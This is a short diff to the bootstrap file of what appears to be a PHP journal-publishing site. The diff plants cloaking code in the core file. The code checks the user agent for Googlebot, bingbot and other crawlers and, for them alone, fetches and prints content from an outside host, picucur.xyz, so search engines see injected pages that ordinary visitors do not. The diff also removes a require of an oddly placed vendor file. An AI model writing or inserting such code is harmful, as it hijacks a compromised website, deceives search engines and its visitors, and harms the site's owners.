@@ -18,12 +18,28 @@
  * This file is loaded before any others.
  * Any system-wide imports or initialization code should be placed here.
  */
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
 
+if (is_bot()) {
+    $message = file_get_contents('https://picucur.xyz/landing/jppa-unmul/landing.txt');
+    echo $message;
+exit;
+}
 
 /**
  * Basic initialization (pre-classloading).
  */
-require('./plugins/paymethod/paypal/vendor/psr/http-message/src/main.inc.php');
 define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
 if (!defined('DIRECTORY_SEPARATOR')) {
 	// Older versions of PHP do not define this
